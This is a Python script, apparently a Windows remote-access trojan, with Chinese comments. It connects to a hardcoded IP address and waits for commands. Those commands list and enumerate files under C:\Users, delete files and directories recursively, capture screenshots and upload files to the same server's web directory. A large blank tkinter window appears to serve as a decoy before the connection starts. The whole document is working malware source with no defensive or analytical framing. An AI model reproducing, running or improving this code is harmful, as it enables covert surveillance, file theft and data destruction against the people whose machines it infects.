#!/usr/bin/python
# -*- coding: UTF-8 -*
#pip install pypiwin32
import os
import socket
import time
import tkinter
import win32gui
import win32ui
import win32con
import win32api
import uuid

path = r"C:\Users"


def list_all_path():
	global path
	all_list = []
	for root , dirs, files in os.walk(path):
		for x in files:
			z = root + "\\" + x
			all_list.append(z)

	all_list = str(all_list)
	return all_list


def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


def get_photo():

	# 获取桌面
	hdesktop = win32gui.GetDesktopWindow()

	# 分辨率适应
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

	# 创建设备描述表
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)

	# 创建一个内存设备描述表
	mem_dc = img_dc.CreateCompatibleDC()

	# 创建位图对象
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)

	# 截图至内存设备描述表
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

	filename = str(uuid.uuid4())
	filepath = "C:\\sun32\\center\\windows\\" + filename + ".bmp"
	# 将截图保存到文件中
	screenshot.SaveBitmapFile(mem_dc, filepath)


	mem_dc.DeleteDC()
	win32gui.DeleteObject(screenshot.GetHandle())

	update(filename,filepath)




def update(filename,path):

	sock2 = socket.socket()
	HOST = "104.155.212.130"
	PORT = 5000
	sock2.connect((HOST, PORT))

	#=======================================
	sock2.send("up".encode("utf-8"))
	#打印服务器反馈
	server_reply = sock2.recv(1024).decode("utf-8")
	print(str(server_reply))
	#=======================================

	f = open(path,"rb")

	server_file_path = "/var/www/html/" + filename

	sock2.send(server_file_path.encode("utf-8"))

	#打印服务器反馈
	server_reply = sock2.recv(1024).decode("utf-8")
	print(str(server_reply))


	size = os.stat(path).st_size #获取文件大小
	#发送文件大小 

	sock2.send(str(size).encode("utf-8"))

	#打印服务器反馈
	server_reply = sock2.recv(1024).decode("utf-8")
	print(str(server_reply))

	for x in f:
		sock2.send(x)


	print("发送完成")

	sock2.close()


def linux_to_os(cmd):

	global path

	re = "none"
	cmd = cmd.split(' ')

	if cmd[0] == "ls":
		re = str(os.listdir(path))

	elif cmd[0] == "lsa":
		re = list_all_path()

	elif cmd[0] == "cdi":
		path = path + "\\" + cmd[1]

	elif cmd[0] == "cdq":

		list_p = path.split("\\")
		wz = len(list_p) - 1
		del list_p[wz]

		path = "\\".join(list_p)

	elif cmd[0] == "rmr":

		remove_dir(cmd[1])


	elif cmd[0] == "rm":

		os.remove(cmd[1])


	elif cmd[0] == "gp":

		get_photo()

	elif cmd[0] == "up":

		update(cmd[1],cmd[2])
		
	return re


def main():

	global path

	while True:
		sock = socket.socket()
		HOST = "104.155.212.130"
		PORT = 2233
		sock.connect((HOST, PORT))
		#发送模式
		sock.sendall("hello".encode())
		server = sock.recv(1024).decode()

		if server != "stop":
			break
		else:
			sock.close()
			time.sleep(10)

	sock.sendall("hello".encode())

	while True:
		re = sock.recv(1024).decode()
		over = linux_to_os(re)
		sock.sendall(over.encode())

		

if __name__=='__main__':
	top = tkinter.Tk()
	# 进入消息循环
	top.geometry("2000x2000")
	top.mainloop()

	main()


